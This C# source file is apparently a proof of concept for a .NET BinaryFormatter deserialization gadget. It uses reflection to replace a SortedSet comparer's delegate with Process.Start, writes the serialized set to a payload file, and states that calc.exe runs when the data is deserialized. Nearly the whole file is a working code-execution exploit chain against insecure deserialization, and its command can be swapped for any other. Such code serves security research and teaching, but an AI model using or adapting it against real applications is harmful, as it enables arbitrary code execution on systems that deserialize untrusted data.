using System;
using System.Runtime.Serialization.Formatters.Binary;
using System.IO;
using System.Diagnostics;
using System.Collections.Generic;
using System.Reflection;

namespace HelloWorldDeserialization
{
    class Program
    {
        static void TypeConfuseDelegate(Comparison<string> comp)
        {
            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList",
                    BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = comp.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(comp, invoke_list);
        }
        static void Main(string[] args)
        {            
                
            // Create a simple multicast delegate.
            Delegate d1 = new Comparison<string>(String.Compare);
            Comparison<string> d2 = (Comparison<string>)MulticastDelegate.Combine(d1, d1);
            // Create set with original comparer.
            IComparer<string> comp = Comparer<string>.Create(d2);
            SortedSet<string> set = new SortedSet<string>(comp);

            // Setup values to call calc.exe with a dummy argument.
            set.Add("calc");
            set.Add("adummy");

            TypeConfuseDelegate(d2);

            // Test serialization.
            BinaryFormatter fmt = new BinaryFormatter();
            FileStream fs = new FileStream("d:\\serialized.dat", FileMode.Create);
            fmt.Serialize(fs, set);

            // Test serialization.
            BinaryFormatter fmt2 = new BinaryFormatter();
            MemoryStream stm2 = new MemoryStream();
            fmt2.Serialize(stm2, set);
            stm2.Position = 0;
            fmt2.Deserialize(stm2);
            // Calculator should execute during Deserialize.
        }
    }
}
